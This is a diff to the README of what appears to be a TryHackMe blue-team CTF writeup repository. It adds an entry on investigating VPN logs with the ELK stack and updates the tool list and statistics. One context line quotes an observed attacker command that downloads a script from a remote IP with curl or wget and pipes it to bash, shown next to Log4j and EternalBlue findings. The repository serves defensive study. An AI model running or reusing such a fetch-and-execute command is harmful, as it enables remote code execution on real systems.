@@ -169,7 +169,7 @@ Log4j: Base64 RCE payload, CVSS 9.3
 ```
 
 **Critical vulnerabilities detected**:
-- MS17-010 (EternalBlue): \\192.168.116.138\IPC$
+- MS17-010 (EternalBlue): \\\\192.168.116.138\\IPC$
 - Log4j (CVE-2021-44228): Remote code execution
 - Attacker command: `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`
 
@@ -239,12 +239,47 @@ Detection Rules: PowerShell Startup, Registry Persistence
 
 ---
 
+### 📊 Investigating with ELK 101 - Elastic Stack Basics
+**Difficulty**: Medium | **Score**: 13/13 (100%) | **Path**: SOC Level 1
+
+Understand how SOC analysts use the Elastic Stack (ELK) for log investigations. Master Kibana Discover tab, KQL search queries, and create visualizations and dashboards for security monitoring.
+
+[📖 View complete writeup →](./investigating-with-elk-101/)
+
+**Skills demonstrated**:
+- ✅ ELK Stack components (Elasticsearch, Logstash, Kibana, Beats)
+- ✅ Kibana Discover tab for log investigation
+- ✅ KQL (Kibana Query Language) queries
+- ✅ Visualization creation and dashboard building
+- ✅ VPN log analysis for security incidents
+- ✅ Failed login investigation and user behavior analytics
+
+**Investigation completed**:
+```
+VPN Logs (Dec 2021 - Feb 2022) → 2861 connections
+    ↓
+Discovered: High-Volume User (James), Failed Logins (Simon - 274 attempts)
+    ↓
+Critical Finding: Post-Termination Access (Johny Brown - 1 connection)
+    ↓
+Traffic Anomaly: Jan 11 Spike (IP 172.201.60.191)
+```
+
+**Critical findings**:
+- 1 post-termination access violation
+- 274 failed VPN attempts in January
+- 5 security observations identified
+- 1 VPN monitoring dashboard created
+
+---
+
 ## 🛠️ Tools and Technologies
 
 - **Wireshark/tshark** - PCAP analysis
 - **Zeek (Bro)** - Network security monitoring
 - **Snort** - Intrusion Detection/Prevention System
 - **Atomic Red Team** - Threat emulation framework
+- **ELK Stack (Elasticsearch, Logstash, Kibana)** - Log analysis and SIEM
 - **PowerShell** - Security testing automation
 - **Sysmon** - Windows event monitoring
 - **VirusTotal** - Malware analysis
@@ -304,7 +339,11 @@ tryhackme-blueteam-ctf/
 │   ├── README.md              # Overview
 │   └── SUMMARY.md             # Executive summary
 │
-└── atomic-red-team/           # Atomic Red Team - Threat Emulation
+├── atomic-red-team/           # Atomic Red Team - Threat Emulation
+│   ├── README.md              # Overview and technical writeup
+│   └── SUMMARY.md             # Executive summary
+│
+└── investigating-with-elk-101/    # Investigating with ELK 101
     ├── README.md              # Overview and technical writeup
     └── SUMMARY.md             # Executive summary
 ```
@@ -348,11 +387,11 @@ cat dns.log | zeek-cut query qtype_name
 
 | Metric | Value |
 |--------|-------|
-| CTFs completed | 7 |
+| CTFs completed | 8 |
 | Average success rate | 100% |
-| Total questions | 125 |
-| Questions answered | 125 |
-| Documentation pages | 250+ |
+| Total questions | 138 |
+| Questions answered | 138 |
+| Documentation pages | 300+ |
 | PCAPs analyzed | 6+ |
 | Attack chains identified | 11 |
 | Attacks blocked (live) | 2 |
@@ -421,6 +460,7 @@ This repository is provided "as is" for educational purposes. Writeups and analy
 
 ## 🔄 Updates
 
+- **2025-12-26**: Added Investigating with ELK 101 - 100% completed
 - **2025-12-26**: Added Atomic Red Team - 100% completed
 - **2025-12-26**: Added Snort Challenge - Live Attacks - 100% completed
 - **2025-12-26**: Added Snort Challenge - The Basics - 100% completed
